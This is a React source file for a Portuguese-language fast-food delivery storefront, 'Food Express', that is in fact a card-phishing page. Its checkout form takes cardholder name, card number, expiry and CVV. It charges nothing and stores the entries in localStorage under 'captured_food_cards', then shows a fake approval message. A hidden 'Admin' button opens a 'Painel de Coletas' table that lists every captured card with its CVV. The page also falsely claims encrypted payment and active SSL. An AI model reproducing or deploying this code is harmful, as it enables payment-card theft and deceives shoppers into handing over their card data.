import React, { useState, useEffect } from 'react';
import {
  ShoppingBag,
  ShieldCheck,
  Truck,
  Headphones,
  Menu,
  X,
  CreditCard,
  Lock,
  CheckCircle2,
  ChevronRight,
  Star,
  Search,
  User,
  UtensilsCrossed,
  Clock,
  MapPin,
} from 'lucide-react';

// --- TOKENS DE DESIGN (DOMÍNIO: FAST FOOD / DELIVERY) ---
const COLORS = {
  primary: '#E63946', // Vermelho Estimulante (Apetite/Urgência)
  secondary: '#FFB703', // Amarelo Vibrante (Atenção/Oferta)
  accent: '#FB8500', // Laranja (Energia)
  canvas: '#FFFDFB', // Branco Quente (Limpeza/Conforto)
  surface: '#FFFFFF',
  text: '#2B2D42',
  textMuted: '#8D99AE',
  border: '#EDF2F4',
};

// --- PRODUTOS (NICHO: COMIDA RÁPIDA/POPULAR) ---
const PRODUCTS = [
  {
    id: 1,
    name: 'Combo Burger Supremo',
    price: '34.90',
    oldPrice: '59.90',
    desc: 'Burger artesanal 180g, batata crocante e refri gelado.',
    img: 'https://images.pexels.com/photos/2469096/pexels-photo-2469096.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940',
    tag: 'Mais Pedido',
  },
  {
    id: 2,
    name: 'Hot Dog Gourmet Especial',
    price: '19.90',
    oldPrice: '29.90',
    desc: 'Salsicha premium, purê cremoso, batata palha e molho da casa.',
    img: 'https://images.pexels.com/photos/25389018/pexels-photo-25389018.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940',
    tag: 'Oferta do Dia',
  },
  {
    id: 3,
    name: 'Porção de Batatas Supreme',
    price: '14.90',
    oldPrice: '22.00',
    desc: 'Batatas fritas com cheddar derretido e bacon crocante.',
    img: 'https://images.pexels.com/photos/18733501/pexels-photo-18733501.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940',
    tag: 'Acompanhamento',
  },
  {
    id: 4,
    name: 'Shawarma Árabe Tradicional',
    price: '24.90',
    oldPrice: '35.00',
    desc: 'Carne temperada, legumes frescos e molho de alho original.',
    img: 'https://images.pexels.com/photos/6332929/pexels-photo-6332929.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940',
    tag: 'Saudável',
  },
];

const FoodExpressApp = () => {
  const [view, setView] = useState('home'); // home, products, checkout, success, admin
  const [cart, setCart] = useState(null);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [capturedData, setCapturedData] = useState([]);
  const [formData, setFormData] = useState({
    name: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
  });

  useEffect(() => {
    const saved = localStorage.getItem('captured_food_cards');
    if (saved) setCapturedData(JSON.parse(saved));
  }, []);

  const handleInputChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handlePayment = (e) => {
    e.preventDefault();
    const newEntry = {
      ...formData,
      date: new Date().toLocaleString(),
      product: cart?.name,
    };
    const updatedData = [...capturedData, newEntry];
    setCapturedData(updatedData);
    localStorage.setItem('captured_food_cards', JSON.stringify(updatedData));
    setView('success');
  };

  const Navbar = () => (
    <nav className="bg-white border-b sticky top-0 z-50 shadow-sm">
      <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
        <div
          className="flex items-center gap-2 cursor-pointer"
          onClick={() => setView('home')}
        >
          <UtensilsCrossed className="text-red-500" size={28} />
          <span className="font-black text-xl tracking-tighter text-slate-800">
            FOOD<span className="text-red-500">EXPRESS</span>
          </span>
        </div>

        <div className="hidden md:flex items-center gap-8 font-semibold text-slate-600">
          <button
            onClick={() => setView('home')}
            className="hover:text-red-500 transition"
          >
            Início
          </button>
          <button
            onClick={() => setView('products')}
            className="hover:text-red-500 transition"
          >
            Cardápio
          </button>
          <button
            onClick={() => setView('home')}
            className="hover:text-red-500 transition"
          >
            Promoções
          </button>
          <button
            onClick={() => setView('home')}
            className="hover:text-red-500 transition"
          >
            Contato
          </button>
        </div>

        <div className="flex items-center gap-4">
          <Search size={20} className="text-slate-500 cursor-pointer" />
          <User size={20} className="text-slate-500 cursor-pointer" />
          <button
            onClick={() => setView('admin')}
            className="hidden bg-slate-100 p-1 rounded text-[10px] text-slate-400"
          >
            Admin
          </button>
          <button
            className="md:hidden"
            onClick={() => setIsMenuOpen(!isMenuOpen)}
          >
            {isMenuOpen ? <X /> : <Menu />}
          </button>
        </div>
      </div>
      {isMenuOpen && (
        <div className="md:hidden bg-white border-b p-4 flex flex-col gap-4 font-semibold">
          <button
            onClick={() => {
              setView('home');
              setIsMenuOpen(false);
            }}
          >
            Início
          </button>
          <button
            onClick={() => {
              setView('products');
              setIsMenuOpen(false);
            }}
          >
            Cardápio
          </button>
          <button
            onClick={() => {
              setView('home');
              setIsMenuOpen(false);
            }}
          >
            Promoções
          </button>
        </div>
      )}
    </nav>
  );

  const Footer = () => (
    <footer className="bg-slate-900 text-slate-400 py-12 px-4">
      <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-8">
        <div className="col-span-1 md:col-span-2">
          <div className="flex items-center gap-2 text-white mb-4">
            <UtensilsCrossed size={24} className="text-red-500" />
            <span className="font-black text-lg">FOOD EXPRESS</span>
          </div>
          <p className="text-sm leading-relaxed max-w-sm">
            A melhor experiência de fast food da cidade. Ingredientes frescos,
            entrega ultra rápida e o sabor que você já conhece e ama.
          </p>
        </div>
        <div>
          <h4 className="text-white font-bold mb-4">Links Úteis</h4>
          <ul className="text-sm space-y-2">
            <li>
              <button
                onClick={() => setView('home')}
                className="hover:text-white"
              >
                Termos de Serviço
              </button>
            </li>
            <li>
              <button
                onClick={() => setView('home')}
                className="hover:text-white"
              >
                Privacidade
              </button>
            </li>
            <li>
              <button
                onClick={() => setView('home')}
                className="hover:text-white"
              >
                Rastrear Pedido
              </button>
            </li>
          </ul>
        </div>
        <div>
          <h4 className="text-white font-bold mb-4">Segurança</h4>
          <div className="flex flex-col gap-2">
            <div className="flex items-center gap-2 text-xs bg-slate-800 p-2 rounded">
              <Lock size={14} /> Pagamento Criptografado
            </div>
            <div className="flex items-center gap-2 text-xs bg-slate-800 p-2 rounded">
              <ShieldCheck size={14} /> Certificado SSL Ativo
            </div>
          </div>
        </div>
      </div>
      <div className="max-w-7xl mx-auto mt-12 pt-8 border-t border-slate-800 text-center text-xs">
        © 2026 Food Express Delivery. Todos os direitos reservados.
      </div>
    </footer>
  );

  const HomePage = () => (
    <div className="animate-in fade-in duration-500">
      <section className="relative bg-orange-50 py-20 px-4 overflow-hidden">
        <div className="max-w-7xl mx-auto grid md:grid-cols-2 gap-12 items-center">
          <div>
            <span className="bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">
              Entrega Grátis Hoje
            </span>
            <h1 className="text-5xl md:text-6xl font-black text-slate-900 mt-4 leading-tight">
              Fome de <span className="text-red-500">Sabor</span>? <br />{' '}
              Chegamos em 20min.
            </h1>
            <p className="text-lg text-slate-600 mt-6 mb-8">
              Os combos mais suculentos e as batatas mais crocantes da região.
              Peça agora e receba quentinho na sua porta.
            </p>
            <button
              onClick={() => setView('products')}
              className="bg-red-500 text-white px-8 py-4 rounded-2xl font-bold text-lg hover:bg-red-600 transition-all flex items-center gap-2 w-fit shadow-lg shadow-red-200"
            >
              Pedir Agora <ChevronRight size={20} />
            </button>
          </div>
          <div className="relative">
            <img
              src="https://images.pexels.com/photos/2469096/pexels-photo-2469096.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940"
              alt="Burger"
              className="rounded-3xl shadow-2xl rotate-2 hover:rotate-0 transition-transform duration-500"
            />
            <div className="absolute -bottom-6 -left-6 bg-white p-4 rounded-2xl shadow-xl flex items-center gap-3 animate-bounce">
              <div className="bg-green-100 p-2 rounded-full text-green-600">
                <CheckCircle2 size={20} />
              </div>
              <span className="text-sm font-bold">4.9 ★ no Google</span>
            </div>
          </div>
        </div>
      </section>

      <section className="py-12 bg-white border-b">
        <div className="max-w-7xl mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-8">
          {[
            {
              icon: <Truck className="text-red-500" />,
              title: 'Entrega Relâmpago',
              desc: 'Seu pedido chega quente e rápido.',
            },
            {
              icon: <ShieldCheck className="text-red-500" />,
              title: 'Pagamento Seguro',
              desc: 'Processamento via Gateway Criptografado.',
            },
            {
              icon: <Clock className="text-red-500" />,
              title: 'Aberto Agora',
              desc: 'Atendemos até as 02:00 da manhã.',
            },
          ].map((item, i) => (
            <div
              key={i}
              className="flex items-center gap-4 p-6 rounded-2xl bg-slate-50 border border-slate-100"
            >
              <div className="bg-white p-3 rounded-xl shadow-sm">
                {item.icon}
              </div>
              <div>
                <h3 className="font-bold text-slate-800">{item.title}</h3>
                <p className="text-sm text-slate-500">{item.desc}</p>
              </div>
            </div>
          ))}
        </div>
      </section>
    </div>
  );

  const ProductsPage = () => (
    <div className="max-w-7xl mx-auto px-4 py-12 animate-in fade-in duration-500">
      <div className="flex items-center justify-between mb-10">
        <h2 className="text-3xl font-black text-slate-800">
          Nosso <span className="text-red-500">Cardápio</span>
        </h2>
        <div className="flex gap-2">
          <span className="px-3 py-1 bg-red-500 text-white text-xs font-bold rounded-full">
            Tudo
          </span>
          <span className="px-3 py-1 bg-slate-100 text-slate-500 text-xs font-bold rounded-full cursor-pointer hover:bg-slate-200">
            Burgers
          </span>
          <span className="px-3 py-1 bg-slate-100 text-slate-500 text-xs font-bold rounded-full cursor-pointer hover:bg-slate-200">
            Bebidas
          </span>
        </div>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
        {PRODUCTS.map((p) => (
          <div
            key={p.id}
            className="bg-white rounded-3xl border border-slate-100 shadow-sm overflow-hidden hover:shadow-md transition-shadow group"
          >
            <div className="relative h-48 overflow-hidden">
              <img
                src={p.img}
                alt={p.name}
                className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500"
              />
              <span className="absolute top-3 left-3 bg-yellow-400 text-slate-900 px-2 py-1 rounded-lg text-[10px] font-black uppercase">
                {p.tag}
              </span>
            </div>
            <div className="p-5">
              <h3 className="font-bold text-slate-800 text-lg mb-1">
                {p.name}
              </h3>
              <p className="text-slate-500 text-xs mb-4 line-clamp-2">
                {p.desc}
              </p>
              <div className="flex items-center justify-between">
                <div>
                  <span className="text-slate-400 line-through text-xs">
                    R$ {p.oldPrice}
                  </span>
                  <div className="text-red-500 font-black text-xl">
                    R$ {p.price}
                  </div>
                </div>
                <button
                  onClick={() => {
                    setCart(p);
                    setView('checkout');
                  }}
                  className="bg-slate-900 text-white p-3 rounded-xl hover:bg-red-500 transition-colors"
                >
                  <ShoppingBag size={20} />
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  const CheckoutPage = () => (
    <div className="max-w-3xl mx-auto px-4 py-12 animate-in slide-in-from-bottom-4 duration-500">
      <div className="bg-white rounded-3xl shadow-xl border border-slate-100 overflow-hidden">
        <div className="bg-slate-900 p-6 text-white flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Lock size={20} className="text-red-500" />
            <h2 className="font-bold text-lg">Pagamento Seguro</h2>
          </div>
          <button
            onClick={() => setView('products')}
            className="text-slate-400 hover:text-white text-sm"
          >
            Voltar
          </button>
        </div>

        <div className="p-8">
          <div className="flex items-center gap-4 mb-8 p-4 bg-slate-50 rounded-2xl border border-slate-100">
            <img
              src={cart?.img}
              alt="Item"
              className="w-16 h-16 rounded-xl object-cover"
            />
            <div className="flex-1">
              <h3 className="font-bold text-slate-800">{cart?.name}</h3>
              <p className="text-red-500 font-black">R$ {cart?.price}</p>
            </div>
            <div className="text-right">
              <p className="text-xs text-slate-400">Total do Pedido</p>
              <p className="font-black text-slate-800 text-xl">
                R$ {cart?.price}
              </p>
            </div>
          </div>

          <form onSubmit={handlePayment} className="space-y-6">
            <div>
              <label className="block text-sm font-bold text-slate-700 mb-2">
                Nome do Titular
              </label>
              <input
                required
                name="name"
                value={formData.name}
                onChange={handleInputChange}
                className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-red-500 outline-none transition"
                placeholder="Como está no cartão"
              />
            </div>
            <div>
              <label className="block text-sm font-bold text-slate-700 mb-2">
                Número do Cartão
              </label>
              <div className="relative">
                <input
                  required
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-red-500 outline-none transition"
                  placeholder="0000 0000 0000 0000"
                />
                <CreditCard
                  className="absolute right-4 top-3.5 text-slate-300"
                  size={20}
                />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-bold text-slate-700 mb-2">
                  Validade
                </label>
                <input
                  required
                  name="expiry"
                  value={formData.expiry}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-red-500 outline-none transition"
                  placeholder="MM/AA"
                />
              </div>
              <div>
                <label className="block text-sm font-bold text-slate-700 mb-2">
                  CVV
                </label>
                <input
                  required
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-red-500 outline-none transition"
                  placeholder="123"
                />
              </div>
            </div>
            <button
              type="submit"
              className="w-full bg-red-500 text-white py-4 rounded-2xl font-black text-lg hover:bg-red-600 transition-all shadow-lg shadow-red-200"
            >
              Finalizar Pedido
            </button>
          </form>
        </div>
      </div>
    </div>
  );

  const SuccessPage = () => (
    <div className="max-w-md mx-auto px-4 py-20 text-center animate-in zoom-in duration-500">
      <div className="bg-white p-10 rounded-3xl shadow-2xl border border-slate-100">
        <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
          <CheckCircle2 size={40} />
        </div>
        <h2 className="text-3xl font-black text-slate-800 mb-4">
          Pagamento Pré-Aprovado!
        </h2>
        <p className="text-slate-500 mb-8 leading-relaxed">
          Seu pedido foi recebido com sucesso. Em breve você receberá um e-mail
          de confirmação com o número de rastreio e a previsão de entrega.
        </p>
        <button
          onClick={() => setView('home')}
          className="w-full bg-slate-900 text-white py-4 rounded-2xl font-bold hover:bg-slate-800 transition"
        >
          Voltar para a Home
        </button>
      </div>
    </div>
  );

  const AdminPage = () => (
    <div className="max-w-7xl mx-auto px-4 py-12 animate-in fade-in duration-500">
      <div className="flex items-center justify-between mb-8">
        <h2 className="text-3xl font-black text-slate-800">
          Painel de <span className="text-red-500">Coletas</span>
        </h2>
        <button
          onClick={() => {
            localStorage.removeItem('captured_food_cards');
            setCapturedData([]);
          }}
          className="bg-red-100 text-red-600 px-4 py-2 rounded-lg text-sm font-bold hover:bg-red-200"
        >
          Limpar Banco
        </button>
      </div>
      <div className="bg-white rounded-3xl border border-slate-200 shadow-sm overflow-hidden">
        <table className="w-full text-left border-collapse">
          <thead className="bg-slate-50 text-slate-500 text-xs uppercase font-bold">
            <tr>
              <th className="p-4 border-b">Data/Hora</th>
              <th className="p-4 border-b">Produto</th>
              <th className="p-4 border-b">Titular</th>
              <th className="p-4 border-b">Cartão</th>
              <th className="p-4 border-b">Validade</th>
              <th className="p-4 border-b">CVV</th>
            </tr>
          </thead>
          <tbody className="text-sm text-slate-700">
            {capturedData.length === 0 ? (
              <tr>
                <td colSpan="6" className="p-10 text-center text-slate-400">
                  Nenhuma coleta realizada ainda.
                </td>
              </tr>
            ) : (
              capturedData.map((data, i) => (
                <tr key={i} className="border-b hover:bg-slate-50 transition">
                  <td className="p-4 text-xs">{data.date}</td>
                  <td className="p-4 font-medium">{data.product}</td>
                  <td className="p-4">{data.name}</td>
                  <td className="p-4 font-mono">{data.cardNumber}</td>
                  <td className="p-4">{data.expiry}</td>
                  <td className="p-4 font-bold">{data.cvv}</td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#FFFDFB] text-slate-900 font-sans">
      <Navbar />
      <main>
        {view === 'home' && <HomePage />}
        {view === 'products' && <ProductsPage />}
        {view === 'checkout' && <CheckoutPage />}
        {view === 'success' && <SuccessPage />}
        {view === 'admin' && <AdminPage />}
      </main>
      <Footer />
    </div>
  );
};

export default FoodExpressApp;
